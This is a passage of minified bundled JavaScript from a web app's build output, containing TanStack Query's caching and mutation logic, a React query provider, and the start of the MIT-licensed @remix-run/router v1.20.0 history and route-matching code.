w;s=y=>{(n||d())&&v(y)},(w=t.onPause)==null||w.call(t)}).then(()=>{var v;s=void 0,n||(v=t.onContinue)==null||v.call(t)}),g=()=>{if(n)return;let v;const w=r===0?t.initialPromise:void 0;try{v=w??t.fn()}catch(y){v=Promise.reject(y)}Promise.resolve(v).then(h).catch(y=>{var N;if(n)return;const x=t.retry??(ic?0:3),b=t.retryDelay??i2,j=typeof b=="function"?b(r,y):b,_=x===!0||typeof x=="number"&&r<x||typeof x=="function"&&x(r,y);if(e||!_){f(y);return}r++,(N=t.onFail)==null||N.call(t,r,y),ZS(j).then(()=>d()?void 0:m()).then(()=>{e?f(y):g()})})};return{promise:i,cancel:o,continue:()=>(s==null||s(),i),cancelRetry:l,continueRetry:c,canStart:u,start:()=>(u()?g():m().then(g),i)}}function o2(){let t=[],e=0,r=l=>{l()},n=l=>{l()},s=l=>setTimeout(l,0);const i=l=>{e?t.push(l):s(()=>{r(l)})},o=()=>{const l=t;t=[],l.length&&s(()=>{n(()=>{l.forEach(c=>{r(c)})})})};return{batch:l=>{let c;e++;try{c=l()}finally{e--,e||o()}return c},batchCalls:l=>(...c)=>{i(()=>{l(...c)})},schedule:i,setNotifyFunction:l=>{r=l},setBatchNotifyFunction:l=>{n=l},setScheduler:l=>{s=l}}}var ft=o2(),ls,Z0,qy=(Z0=class{constructor(){ve(this,ls)}destroy(){this.clearGcTimeout()}scheduleGc(){this.clearGcTimeout(),YS(this.gcTime)&&ce(this,ls,setTimeout(()=>{this.optionalRemove()},this.gcTime))}updateGcTime(t){this.gcTime=Math.max(this.gcTime||0,t??(ic?1/0:5*60*1e3))}clearGcTimeout(){L(this,ls)&&(clearTimeout(L(this,ls)),ce(this,ls,void 0))}},ls=new WeakMap,Z0),oa,la,Dt,it,Bi,cs,tr,Tr,ep,l2=(ep=class extends qy{constructor(e){super();ve(this,tr);ve(this,oa);ve(this,la);ve(this,Dt);ve(this,it);ve(this,Bi);ve(this,cs);ce(this,cs,!1),ce(this,Bi,e.defaultOptions),this.setOptions(e.options),this.observers=[],ce(this,Dt,e.cache),this.queryKey=e.queryKey,this.queryHash=e.queryHash,ce(this,oa,d2(this.options)),this.state=e.state??L(this,oa),this.scheduleGc()}get meta(){return this.options.meta}get promise(){var e;return(e=L(this,it))==null?void 0:e.promise}setOptions(e){this.options={...L(this,Bi),...e},this.updateGcTime(this.options.gcTime)}optionalRemove(){!this.observers.length&&this.state.fetchStatus==="idle"&&L(this,Dt).remove(this)}setData(e,r){const n=e2(this.state.data,e,this.options);return rt(this,tr,Tr).call(this,{data:n,type:"success",dataUpdatedAt:r==null?void 0:r.updatedAt,manual:r==null?void 0:r.manual}),n}setState(e,r){rt(this,tr,Tr).call(this,{type:"setState",state:e,setStateOptions:r})}cancel(e){var n,s;const r=(n=L(this,it))==null?void 0:n.promise;return(s=L(this,it))==null||s.cancel(e),r?r.then(er).catch(er):Promise.resolve()}destroy(){super.destroy(),this.cancel({silent:!0})}reset(){this.destroy(),this.setState(L(this,oa))}isActive(){return this.observers.some(e=>XS(e.options.enabled,this)!==!1)}isDisabled(){return this.getObserversCount()>0?!this.isActive():this.options.queryFn===cf||this.state.dataUpdateCount+this.state.errorUpdateCount===0}isStale(){return this.state.isInvalidated?!0:this.getObserversCount()>0?this.observers.some(e=>e.getCurrentResult().isStale):this.state.data===void 0}isStaleByTime(e=0){return this.state.isInvalidated||this.state.data===void 0||!JS(this.state.dataUpdatedAt,e)}onFocus(){var r;const e=this.observers.find(n=>n.shouldFetchOnWindowFocus());e==null||e.refetch({cancelRefetch:!1}),(r=L(this,it))==null||r.continue()}onOnline(){var r;const e=this.observers.find(n=>n.shouldFetchOnReconnect());e==null||e.refetch({cancelRefetch:!1}),(r=L(this,it))==null||r.continue()}addObserver(e){this.observers.includes(e)||(this.observers.push(e),this.clearGcTimeout(),L(this,Dt).notify({type:"observerAdded",query:this,observer:e}))}removeObserver(e){this.observers.includes(e)&&(this.observers=this.observers.filter(r=>r!==e),this.observers.length||(L(this,it)&&(L(this,cs)?L(this,it).cancel({revert:!0}):L(this,it).cancelRetry()),this.scheduleGc()),L(this,Dt).notify({type:"observerRemoved",query:this,observer:e}))}getObserversCount(){return this.observers.length}invalidate(){this.state.isInvalidated||rt(this,tr,Tr).call(this,{type:"invalidate"})}fetch(e,r){var c,d,u;if(this.state.fetchStatus!=="idle"){if(this.state.data!==void 0&&(r!=null&&r.cancelRefetch))this.cancel({silent:!0});else if(L(this,it))return L(this,it).continueRetry(),L(this,it).promise}if(e&&this.setOptions(e),!this.options.queryFn){const h=this.observers.find(f=>f.options.queryFn);h&&this.setOptions(h.options)}const n=new AbortController,s=h=>{Object.defineProperty(h,"signal",{enumerable:!0,get:()=>(ce(this,cs,!0),n.signal)})},i=()=>{const h=Vy(this.options,r),f={queryKey:this.queryKey,meta:this.meta};return s(f),ce(this,cs,!1),this.options.persister?this.options.persister(h,f,this):h(f)},o={fetchOptions:r,options:this.options,queryKey:this.queryKey,state:this.state,fetchFn:i};s(o),(c=this.options.behavior)==null||c.onFetch(o,this),ce(this,la,this.state),(this.state.fetchStatus==="idle"||this.state.fetchMeta!==((d=o.fetchOptions)==null?void 0:d.meta))&&rt(this,tr,Tr).call(this,{type:"fetch",meta:(u=o.fetchOptions)==null?void 0:u.meta});const l=h=>{var f,m,g,v;td(h)&&h.silent||rt(this,tr,Tr).call(this,{type:"error",error:h}),td(h)||((m=(f=L(this,Dt).config).onError)==null||m.call(f,h,this),(v=(g=L(this,Dt).config).onSettled)==null||v.call(g,this.state.data,h,this)),this.scheduleGc()};return ce(this,it,Ky({initialPromise:r==null?void 0:r.initialPromise,fn:o.fetchFn,abort:n.abort.bind(n),onSuccess:h=>{var f,m,g,v;if(h===void 0){l(new Error(`${this.queryHash} data is undefined`));return}try{this.setData(h)}catch(w){l(w);return}(m=(f=L(this,Dt).config).onSuccess)==null||m.call(f,h,this),(v=(g=L(this,Dt).config).onSettled)==null||v.call(g,h,this.state.error,this),this.scheduleGc()},onError:l,onFail:(h,f)=>{rt(this,tr,Tr).call(this,{type:"failed",failureCount:h,error:f})},onPause:()=>{rt(this,tr,Tr).call(this,{type:"pause"})},onContinue:()=>{rt(this,tr,Tr).call(this,{type:"continue"})},retry:o.options.retry,retryDelay:o.options.retryDelay,networkMode:o.options.networkMode,canRun:()=>!0})),L(this,it).start()}},oa=new WeakMap,la=new WeakMap,Dt=new WeakMap,it=new WeakMap,Bi=new WeakMap,cs=new WeakMap,tr=new WeakSet,Tr=function(e){const r=n=>{switch(e.type){case"failed":return{...n,fetchFailureCount:e.failureCount,fetchFailureReason:e.error};case"pause":return{...n,fetchStatus:"paused"};case"continue":return{...n,fetchStatus:"fetching"};case"fetch":return{...n,...c2(n.data,this.options),fetchMeta:e.meta??null};case"success":return{...n,data:e.data,dataUpdateCount:n.dataUpdateCount+1,dataUpdatedAt:e.dataUpdatedAt??Date.now(),error:null,isInvalidated:!1,status:"success",...!e.manual&&{fetchStatus:"idle",fetchFailureCount:0,fetchFailureReason:null}};case"error":const s=e.error;return td(s)&&s.revert&&L(this,la)?{...L(this,la),fetchStatus:"idle"}:{...n,error:s,errorUpdateCount:n.errorUpdateCount+1,errorUpdatedAt:Date.now(),fetchFailureCount:n.fetchFailureCount+1,fetchFailureReason:s,fetchStatus:"idle",status:"error"};case"invalidate":return{...n,isInvalidated:!0};case"setState":return{...n,...e.state}}};this.state=r(this.state),ft.batch(()=>{this.observers.forEach(n=>{n.onQueryUpdate()}),L(this,Dt).notify({query:this,type:"updated",action:e})})},ep);function c2(t,e){return{fetchFailureCount:0,fetchFailureReason:null,fetchStatus:Gy(e.networkMode)?"fetching":"paused",...t===void 0&&{error:null,status:"pending"}}}function d2(t){const e=typeof t.initialData=="function"?t.initialData():t.initialData,r=e!==void 0,n=r?typeof t.initialDataUpdatedAt=="function"?t.initialDataUpdatedAt():t.initialDataUpdatedAt:0;return{data:e,dataUpdateCount:0,dataUpdatedAt:r?n??Date.now():0,error:null,errorUpdateCount:0,errorUpdatedAt:0,fetchFailureCount:0,fetchFailureReason:null,fetchMeta:null,isInvalidated:!1,status:r?"success":"pending",fetchStatus:"idle"}}var vr,tp,u2=(tp=class extends ac{constructor(e={}){super();ve(this,vr);this.config=e,ce(this,vr,new Map)}build(e,r,n){const s=r.queryKey,i=r.queryHash??lf(s,r);let o=this.get(i);return o||(o=new l2({cache:this,queryKey:s,queryHash:i,options:e.defaultQueryOptions(r),state:n,defaultOptions:e.getQueryDefaults(s)}),this.add(o)),o}add(e){L(this,vr).has(e.queryHash)||(L(this,vr).set(e.queryHash,e),this.notify({type:"added",query:e}))}remove(e){const r=L(this,vr).get(e.queryHash);r&&(e.destroy(),r===e&&L(this,vr).delete(e.queryHash),this.notify({type:"removed",query:e}))}clear(){ft.batch(()=>{this.getAll().forEach(e=>{this.remove(e)})})}get(e){return L(this,vr).get(e)}getAll(){return[...L(this,vr).values()]}find(e){const r={exact:!0,...e};return this.getAll().find(n=>i0(r,n))}findAll(e={}){const r=this.getAll();return Object.keys(e).length>0?r.filter(n=>i0(e,n)):r}notify(e){ft.batch(()=>{this.listeners.forEach(r=>{r(e)})})}onFocus(){ft.batch(()=>{this.getAll().forEach(e=>{e.onFocus()})})}onOnline(){ft.batch(()=>{this.getAll().forEach(e=>{e.onOnline()})})}},vr=new WeakMap,tp),br,ut,ds,wr,Jr,rp,h2=(rp=class extends qy{constructor(e){super();ve(this,wr);ve(this,br);ve(this,ut);ve(this,ds);this.mutationId=e.mutationId,ce(this,ut,e.mutationCache),ce(this,br,[]),this.state=e.state||f2(),this.setOptions(e.options),this.scheduleGc()}setOptions(e){this.options=e,this.updateGcTime(this.options.gcTime)}get meta(){return this.options.meta}addObserver(e){L(this,br).includes(e)||(L(this,br).push(e),this.clearGcTimeout(),L(this,ut).notify({type:"observerAdded",mutation:this,observer:e}))}removeObserver(e){ce(this,br,L(this,br).filter(r=>r!==e)),this.scheduleGc(),L(this,ut).notify({type:"observerRemoved",mutation:this,observer:e})}optionalRemove(){L(this,br).length||(this.state.status==="pending"?this.scheduleGc():L(this,ut).remove(this))}continue(){var e;return((e=L(this,ds))==null?void 0:e.continue())??this.execute(this.state.variables)}async execute(e){var s,i,o,l,c,d,u,h,f,m,g,v,w,y,x,b,j,_,N,S;ce(this,ds,Ky({fn:()=>this.options.mutationFn?this.options.mutationFn(e):Promise.reject(new Error("No mutationFn found")),onFail:(k,C)=>{rt(this,wr,Jr).call(this,{type:"failed",failureCount:k,error:C})},onPause:()=>{rt(this,wr,Jr).call(this,{type:"pause"})},onContinue:()=>{rt(this,wr,Jr).call(this,{type:"continue"})},retry:this.options.retry??0,retryDelay:this.options.retryDelay,networkMode:this.options.networkMode,canRun:()=>L(this,ut).canRun(this)}));const r=this.state.status==="pending",n=!L(this,ds).canStart();try{if(!r){rt(this,wr,Jr).call(this,{type:"pending",variables:e,isPaused:n}),await((i=(s=L(this,ut).config).onMutate)==null?void 0:i.call(s,e,this));const C=await((l=(o=this.options).onMutate)==null?void 0:l.call(o,e));C!==this.state.context&&rt(this,wr,Jr).call(this,{type:"pending",context:C,variables:e,isPaused:n})}const k=await L(this,ds).start();return await((d=(c=L(this,ut).config).onSuccess)==null?void 0:d.call(c,k,e,this.state.context,this)),await((h=(u=this.options).onSuccess)==null?void 0:h.call(u,k,e,this.state.context)),await((m=(f=L(this,ut).config).onSettled)==null?void 0:m.call(f,k,null,this.state.variables,this.state.context,this)),await((v=(g=this.options).onSettled)==null?void 0:v.call(g,k,null,e,this.state.context)),rt(this,wr,Jr).call(this,{type:"success",data:k}),k}catch(k){try{throw await((y=(w=L(this,ut).config).onError)==null?void 0:y.call(w,k,e,this.state.context,this)),await((b=(x=this.options).onError)==null?void 0:b.call(x,k,e,this.state.context)),await((_=(j=L(this,ut).config).onSettled)==null?void 0:_.call(j,void 0,k,this.state.variables,this.state.context,this)),await((S=(N=this.options).onSettled)==null?void 0:S.call(N,void 0,k,e,this.state.context)),k}finally{rt(this,wr,Jr).call(this,{type:"error",error:k})}}finally{L(this,ut).runNext(this)}}},br=new WeakMap,ut=new WeakMap,ds=new WeakMap,wr=new WeakSet,Jr=function(e){const r=n=>{switch(e.type){case"failed":return{...n,failureCount:e.failureCount,failureReason:e.error};case"pause":return{...n,isPaused:!0};case"continue":return{...n,isPaused:!1};case"pending":return{...n,context:e.context,data:void 0,failureCount:0,failureReason:null,error:null,isPaused:e.isPaused,status:"pending",variables:e.variables,submittedAt:Date.now()};case"success":return{...n,data:e.data,failureCount:0,failureReason:null,error:null,status:"success",isPaused:!1};case"error":return{...n,data:void 0,error:e.error,failureCount:n.failureCount+1,failureReason:e.error,isPaused:!1,status:"error"}}};this.state=r(this.state),ft.batch(()=>{L(this,br).forEach(n=>{n.onMutationUpdate(e)}),L(this,ut).notify({mutation:this,type:"updated",action:e})})},rp);function f2(){return{context:void 0,data:void 0,error:null,failureCount:0,failureReason:null,isPaused:!1,status:"idle",variables:void 0,submittedAt:0}}var kt,Vi,np,m2=(np=class extends ac{constructor(e={}){super();ve(this,kt);ve(this,Vi);this.config=e,ce(this,kt,new Map),ce(this,Vi,Date.now())}build(e,r,n){const s=new h2({mutationCache:this,mutationId:++to(this,Vi)._,options:e.defaultMutationOptions(r),state:n});return this.add(s),s}add(e){const r=No(e),n=L(this,kt).get(r)??[];n.push(e),L(this,kt).set(r,n),this.notify({type:"added",mutation:e})}remove(e){var n;const r=No(e);if(L(this,kt).has(r)){const s=(n=L(this,kt).get(r))==null?void 0:n.filter(i=>i!==e);s&&(s.length===0?L(this,kt).delete(r):L(this,kt).set(r,s))}this.notify({type:"removed",mutation:e})}canRun(e){var n;const r=(n=L(this,kt).get(No(e)))==null?void 0:n.find(s=>s.state.status==="pending");return!r||r===e}runNext(e){var n;const r=(n=L(this,kt).get(No(e)))==null?void 0:n.find(s=>s!==e&&s.state.isPaused);return(r==null?void 0:r.continue())??Promise.resolve()}clear(){ft.batch(()=>{this.getAll().forEach(e=>{this.remove(e)})})}getAll(){return[...L(this,kt).values()].flat()}find(e){const r={exact:!0,...e};return this.getAll().find(n=>o0(r,n))}findAll(e={}){return this.getAll().filter(r=>o0(e,r))}notify(e){ft.batch(()=>{this.listeners.forEach(r=>{r(e)})})}resumePausedMutations(){const e=this.getAll().filter(r=>r.state.isPaused);return ft.batch(()=>Promise.all(e.map(r=>r.continue().catch(er))))}},kt=new WeakMap,Vi=new WeakMap,np);function No(t){var e;return((e=t.options.scope)==null?void 0:e.id)??String(t.mutationId)}function d0(t){return{onFetch:(e,r)=>{var u,h,f,m,g;const n=e.options,s=(f=(h=(u=e.fetchOptions)==null?void 0:u.meta)==null?void 0:h.fetchMore)==null?void 0:f.direction,i=((m=e.state.data)==null?void 0:m.pages)||[],o=((g=e.state.data)==null?void 0:g.pageParams)||[];let l={pages:[],pageParams:[]},c=0;const d=async()=>{let v=!1;const w=b=>{Object.defineProperty(b,"signal",{enumerable:!0,get:()=>(e.signal.aborted?v=!0:e.signal.addEventListener("abort",()=>{v=!0}),e.signal)})},y=Vy(e.options,e.fetchOptions),x=async(b,j,_)=>{if(v)return Promise.reject();if(j==null&&b.pages.length)return Promise.resolve(b);const N={queryKey:e.queryKey,pageParam:j,direction:_?"backward":"forward",meta:e.options.meta};w(N);const S=await y(N),{maxPages:k}=e.options,C=_?r2:t2;return{pages:C(b.pages,S,k),pageParams:C(b.pageParams,j,k)}};if(s&&i.length){const b=s==="backward",j=b?p2:u0,_={pages:i,pageParams:o},N=j(n,_);l=await x(_,N,b)}else{const b=t??i.length;do{const j=c===0?o[0]??n.initialPageParam:u0(n,l);if(c>0&&j==null)break;l=await x(l,j),c++}while(c<b)}return l};e.options.persister?e.fetchFn=()=>{var v,w;return(w=(v=e.options).persister)==null?void 0:w.call(v,d,{queryKey:e.queryKey,meta:e.options.meta,signal:e.signal},r)}:e.fetchFn=d}}}function u0(t,{pages:e,pageParams:r}){const n=e.length-1;return e.length>0?t.getNextPageParam(e[n],e,r[n],r):void 0}function p2(t,{pages:e,pageParams:r}){var n;return e.length>0?(n=t.getPreviousPageParam)==null?void 0:n.call(t,e[0],e,r[0],r):void 0}var $e,on,ln,ca,da,cn,ua,ha,sp,g2=(sp=class{constructor(t={}){ve(this,$e);ve(this,on);ve(this,ln);ve(this,ca);ve(this,da);ve(this,cn);ve(this,ua);ve(this,ha);ce(this,$e,t.queryCache||new u2),ce(this,on,t.mutationCache||new m2),ce(this,ln,t.defaultOptions||{}),ce(this,ca,new Map),ce(this,da,new Map),ce(this,cn,0)}mount(){to(this,cn)._++,L(this,cn)===1&&(ce(this,ua,Hy.subscribe(async t=>{t&&(await this.resumePausedMutations(),L(this,$e).onFocus())})),ce(this,ha,kl.subscribe(async t=>{t&&(await this.resumePausedMutations(),L(this,$e).onOnline())})))}unmount(){var t,e;to(this,cn)._--,L(this,cn)===0&&((t=L(this,ua))==null||t.call(this),ce(this,ua,void 0),(e=L(this,ha))==null||e.call(this),ce(this,ha,void 0))}isFetching(t){return L(this,$e).findAll({...t,fetchStatus:"fetching"}).length}isMutating(t){return L(this,on).findAll({...t,status:"pending"}).length}getQueryData(t){var r;const e=this.defaultQueryOptions({queryKey:t});return(r=L(this,$e).get(e.queryHash))==null?void 0:r.state.data}ensureQueryData(t){const e=this.getQueryData(t.queryKey);if(e===void 0)return this.fetchQuery(t);{const r=this.defaultQueryOptions(t),n=L(this,$e).build(this,r);return t.revalidateIfStale&&n.isStaleByTime(a0(r.staleTime,n))&&this.prefetchQuery(r),Promise.resolve(e)}}getQueriesData(t){return L(this,$e).findAll(t).map(({queryKey:e,state:r})=>{const n=r.data;return[e,n]})}setQueryData(t,e,r){const n=this.defaultQueryOptions({queryKey:t}),s=L(this,$e).get(n.queryHash),i=s==null?void 0:s.state.data,o=QS(e,i);if(o!==void 0)return L(this,$e).build(this,n).setData(o,{...r,manual:!0})}setQueriesData(t,e,r){return ft.batch(()=>L(this,$e).findAll(t).map(({queryKey:n})=>[n,this.setQueryData(n,e,r)]))}getQueryState(t){var r;const e=this.defaultQueryOptions({queryKey:t});return(r=L(this,$e).get(e.queryHash))==null?void 0:r.state}removeQueries(t){const e=L(this,$e);ft.batch(()=>{e.findAll(t).forEach(r=>{e.remove(r)})})}resetQueries(t,e){const r=L(this,$e),n={type:"active",...t};return ft.batch(()=>(r.findAll(t).forEach(s=>{s.reset()}),this.refetchQueries(n,e)))}cancelQueries(t={},e={}){const r={revert:!0,...e},n=ft.batch(()=>L(this,$e).findAll(t).map(s=>s.cancel(r)));return Promise.all(n).then(er).catch(er)}invalidateQueries(t={},e={}){return ft.batch(()=>{if(L(this,$e).findAll(t).forEach(n=>{n.invalidate()}),t.refetchType==="none")return Promise.resolve();const r={...t,type:t.refetchType??t.type??"active"};return this.refetchQueries(r,e)})}refetchQueries(t={},e){const r={...e,cancelRefetch:(e==null?void 0:e.cancelRefetch)??!0},n=ft.batch(()=>L(this,$e).findAll(t).filter(s=>!s.isDisabled()).map(s=>{let i=s.fetch(void 0,r);return r.throwOnError||(i=i.catch(er)),s.state.fetchStatus==="paused"?Promise.resolve():i}));return Promise.all(n).then(er)}fetchQuery(t){const e=this.defaultQueryOptions(t);e.retry===void 0&&(e.retry=!1);const r=L(this,$e).build(this,e);return r.isStaleByTime(a0(e.staleTime,r))?r.fetch(e):Promise.resolve(r.state.data)}prefetchQuery(t){return this.fetchQuery(t).then(er).catch(er)}fetchInfiniteQuery(t){return t.behavior=d0(t.pages),this.fetchQuery(t)}prefetchInfiniteQuery(t){return this.fetchInfiniteQuery(t).then(er).catch(er)}ensureInfiniteQueryData(t){return t.behavior=d0(t.pages),this.ensureQueryData(t)}resumePausedMutations(){return kl.isOnline()?L(this,on).resumePausedMutations():Promise.resolve()}getQueryCache(){return L(this,$e)}getMutationCache(){return L(this,on)}getDefaultOptions(){return L(this,ln)}setDefaultOptions(t){ce(this,ln,t)}setQueryDefaults(t,e){L(this,ca).set(Mi(t),{queryKey:t,defaultOptions:e})}getQueryDefaults(t){const e=[...L(this,ca).values()];let r={};return e.forEach(n=>{Oi(t,n.queryKey)&&(r={...r,...n.defaultOptions})}),r}setMutationDefaults(t,e){L(this,da).set(Mi(t),{mutationKey:t,defaultOptions:e})}getMutationDefaults(t){const e=[...L(this,da).values()];let r={};return e.forEach(n=>{Oi(t,n.mutationKey)&&(r={...r,...n.defaultOptions})}),r}defaultQueryOptions(t){if(t._defaulted)return t;const e={...L(this,ln).queries,...this.getQueryDefaults(t.queryKey),...t,_defaulted:!0};return e.queryHash||(e.queryHash=lf(e.queryKey,e)),e.refetchOnReconnect===void 0&&(e.refetchOnReconnect=e.networkMode!=="always"),e.throwOnError===void 0&&(e.throwOnError=!!e.suspense),!e.networkMode&&e.persister&&(e.networkMode="offlineFirst"),e.enabled!==!0&&e.queryFn===cf&&(e.enabled=!1),e}defaultMutationOptions(t){return t!=null&&t._defaulted?t:{...L(this,ln).mutations,...(t==null?void 0:t.mutationKey)&&this.getMutationDefaults(t.mutationKey),...t,_defaulted:!0}}clear(){L(this,$e).clear(),L(this,on).clear()}},$e=new WeakMap,on=new WeakMap,ln=new WeakMap,ca=new WeakMap,da=new WeakMap,cn=new WeakMap,ua=new WeakMap,ha=new WeakMap,sp),x2=p.createContext(void 0),y2=({client:t,children:e})=>(p.useEffect(()=>(t.mount(),()=>{t.unmount()}),[t]),a.jsx(x2.Provider,{value:t,children:e}));/**
 * @remix-run/router v1.20.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function $i(){return $i=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var r=arguments[e];for(var n in r)Object.prototype.hasOwnProperty.call(r,n)&&(t[n]=r[n])}return t},$i.apply(this,arguments)}var hn;(function(t){t.Pop="POP",t.Push="PUSH",t.Replace="REPLACE"})(hn||(hn={}));const h0="popstate";function v2(t){t===void 0&&(t={});function e(n,s){let{pathname:i,search:o,hash:l}=n.location;return yu("",{pathname:i,search:o,hash:l},s.state&&s.state.usr||null,s.state&&s.state.key||"default")}function r(n,s){return typeof s=="string"?s:Yy(s)}return w2(e,r,null,t)}function We(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function Qy(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function b2(){return Math.random().toString(36).substr(2,8)}function f0(t,e){return{usr:t.state,key:t.key,idx:e}}function yu(t,e,r,n){return r===void 0&&(r=null),$i({pathname:typeof t=="string"?t:t.pathname,search:"",hash:""},typeof e=="string"?Ra(e):e,{state:r,key:e&&e.key||n||b2()})}function Yy(t){let{pathname:e="/",search:r="",hash:n=""}=t;return r&&r!=="?"&&(e+=r.charAt(0)==="?"?r:"?"+r),n&&n!=="#"&&(e+=n.charAt(0)==="#"?n:"#"+n),e}function Ra(t){let e={};if(t){let r=t.indexOf("#");r>=0&&(e.hash=t.substr(r),t=t.substr(0,r));let n=t.indexOf("?");n>=0&&(e.search=t.substr(n),t=t.substr(0,n)),t&&(e.pathname=t)}return e}function w2(t,e,r,n){n===void 0&&(n={});let{window:s=document.defaultView,v5Compat:i=!1}=n,o=s.history,l=hn.Pop,c=null,d=u();d==null&&(d=0,o.replaceState($i({},o.state,{idx:d}),""));function u(){return(o.state||{idx:null}).idx}function h(){l=hn.Pop;let w=u(),y=w==null?null:w-d;d=w,c&&c({action:l,location:v.location,delta:y})}function f(w,y){l=hn.Push;let x=yu(v.location,w,y);d=u()+1;let b=f0(x,d),j=v.createHref(x);try{o.pushState(b,"",j)}catch(_){if(_ instanceof DOMException&&_.name==="DataCloneError")throw _;s.location.assign(j)}i&&c&&c({action:l,location:v.location,delta:1})}function m(w,y){l=hn.Replace;let x=yu(v.location,w,y);d=u();let b=f0(x,d),j=v.createHref(x);o.replaceState(b,"",j),i&&c&&c({action:l,location:v.location,delta:0})}function g(w){let y=s.location.origin!=="null"?s.location.origin:s.location.href,x=typeof w=="string"?w:Yy(w);return x=x.replace(/ $/,"%20"),We(y,"No window.location.(origin|href) available to create URL for href: "+x),new URL(x,y)}let v={get action(){return l},get location(){return t(s,o)},listen(w){if(c)throw new Error("A history only accepts one active listener");return s.addEventListener(h0,h),c=w,()=>{s.removeEventListener(h0,h),c=null}},createHref(w){return e(s,w)},createURL:g,encodeLocation(w){let y=g(w);return{pathname:y.pathname,search:y.search,hash:y.hash}},push:f,replace:m,go(w){return o.go(w)}};return v}var m0;(function(t){t.data="data",t.deferred="deferred",t.redirect="redirect",t.error="error"})(m0||(m0={}));function j2(t,e,r){return r===void 0&&(r="/"),_2(t,e,r,!1)}function _2(t,e,r,n){let s=typeof e=="string"?Ra(e):e,i=Zy(s.pathname||"/",r);if(i==null)return null;let o=Jy(t);N2(o);let l=null;for(let c=0;l==null&&c<o.length;++c){let d=M2(i);l=I2(o[c],d,n)}return l}function Jy(t,e,r,n){e===void 0&&(e=[]),r===void 0&&(r=[]),n===void 0&&(n="");let s=(i,o,l)=>{let c={relativePath:l===void 0?i.path||"":l,caseSensitive:i.caseSensitive===!0,childrenIndex:o,route:i};c.relativePath.startsWith("/")&&(We(c.relativePath.startsWith(n),'Absolute route path "'+c.relativePath+'" nested under path '+('"'+n+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),c.relativePath=c.relativePath.slice(n.length));let d=fs([n,c.relativePath]),u=r.concat(c);i.children&&i.children.length>0&&(We(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+d+'".')),Jy(i.children,e,u,d)),!(i.path==null&&!i.index)&&e.push({path:d,score:A2(d,i.index),routesMeta:u})};return t.forEach((i,o)=>{var l;if(i.path===""||!((l=i.path)!=null&&l.includes("?")))s(i,o);else for(let c of Xy(i.path))s(i,o,c)}),e}function Xy(t){let e=t.split("/");if(e.length===0)return[];let[r,...n]=e,s=r.endsWith("?"),i=r.replace(/\?$/,"");if(n.length===0)return s?[i,""]:[i];let o=Xy(n.join("/")),l=[];return l.push(...o.map(c=>c===""?i:[i,c].join("/"))),s&&l.push(...o),l.map(c=>t.startsWith("/")&&c===""?"/":c)}function N2(t){t.sort((e,r)=>e.score!==r.score?r.score-e.score:R2(e.routesMeta.map(n=>n.childrenIndex),r.routesMeta.map(n=>n.childrenIndex)))}const S2=/^:[\w-]+$/,k2=3,E2=2,C2=1,T2=10,P2=-2,p0=t=>t==="*";function A2(t,e){let r=t.split("/"),n=r.length;return r.some(p0)&&(n+=P2),e&&(n+=E2),r.filter(s=>!p0(s)).reduce((s,i)=>s+(S2.test(i)?k2:i===""?C2:T2),n)}function R2(t,e){return t.length===e.length&&t.slice(0,-1).every((n,s)=>n===e[s])?t[t.length-1]-e[e.length-1]:0}function I2(t,e,r){let{routesMeta:n}=t,s={},i="/",o=[];for(let l=0;l<n.length;++l){let c=n[l],d=l===n.length-1,u=i==="/"?e:e.slice(i.length)||"/",h=g0({path:c.relativePath,caseSensitive:c.caseSensitive,end:d},u),f=c.route;if(!h&&d&&r&&!n[n.length-1].route.index&&(h=g0({path:c.relativePath,caseSensitive:c.caseSensitive,end:!1},u)),!h)return null;Object.assign(s,h.params),o.push({params:s,pathname:fs([i,h.pathname]),pathnameBase:F2(fs([i,h.pathnameBase])),route:f}),h.pathnameBase!=="/"&&(i=fs([i,h.pathnameBase]))}return o}function g0(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[r,n]=L2(t.path,t.caseSensitive,t.end),s=e.match(r);if(!s)return null;let i=s[0],o=i.replace(/(.)\/+$/,"$1"),l=s.slice(1);return{params:n.reduce((d,u,h)=>{let{paramName:f,isOptional:m}=u;if(f==="*"){let v=l[h]||"";o=i.slice(0,i.length-v.length).replace(/(.)\/+$/,"$1")}const g=l[h];return m&&!g?d[f]=void 0:d[f]=(g||"").replace(/%2F/g,"/"),d},{}),pathname:i,pathnameBase:o,pattern:t}}function L2(t,e,r){e===void 0&&(e=!1),r===void 0&&(r=!0),Qy(t==="*"||!t.endsWith("*")||t.endsWith("/*"),'Route path "'+t+'" will be treated as if it were '+('"'+t.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+t.replace(/\*$/,"/*")+'".'));let n=[],s="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,l,c)=>(n.push({paramName:l,isOptional:c!=null}),c?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(n.push({paramName:"*"}),s+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):r?s+="\\/*$":t!==""&&t!=="/"&&(s+="(?:(?=\\/|$))"),[new RegExp(s,e?void 0:"i"),n]}function M2(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return Qy(!1,'The URL path "'+t+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),t}}function Zy(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let r=e.endsWith("/")?e.length-1:e.length,n=t.charAt(r);return n&&n!=="/"?null:t.slice(r)||"/"}function O2(t,e){e===void 0&&(e="/");let{pathname:r,search:n="",hash:s=""}=typeof t=="string"?Ra(t):t;return{pathname:r?r.startsWith("/")?r:$2(r,e):e,search:B2(n),hash:V2(s)}}function $2(t,e){let r=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(s=>{s===".."?r.length>1&&r.pop():s!=="."&&r.push(s)}),r.length>1?r.join("/"):"/"}function 